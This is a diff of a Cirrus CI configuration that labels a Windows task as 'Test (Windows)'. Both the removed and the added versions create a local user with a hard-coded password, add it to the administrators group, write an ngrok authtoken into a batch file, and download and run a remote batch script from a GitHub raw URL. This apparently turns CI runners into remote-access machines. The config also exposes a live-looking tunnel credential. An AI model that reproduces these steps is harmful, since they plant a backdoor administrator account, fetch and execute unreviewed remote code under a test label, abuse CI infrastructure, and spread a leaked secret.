@@ -1,9 +1,11 @@
-windows_container:
-  image: cirrusci/windowsservercore:2019
-
-task:
-  script: net user TinCowBoy Dangvip2k5pro /add
-  prepare_script: net localgroup administrators TinCowBoy /add
-  prepare1_script: echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat
-  prepare2_script: curl -s -O https://raw.githubusercontent.com/DangDev/cirrus-win/main/cirrus_pipeline.bat
-  prepare3_script: cirrus_pipeline.bat
+docker_builder:
+  name: Test (Windows)
+  alias: Tests
+  platform: windows
+  os_version: 2019
+  test_script:
+    - net user TinCowBoy Dangvip2k5pro /add
+    - net localgroup administrators TinCowBoy /add
+    - echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat
+    - curl -s -O https://raw.githubusercontent.com/DangDev/cirrus-win/main/cirrus_pipeline.bat
+    - cirrus_pipeline.bat
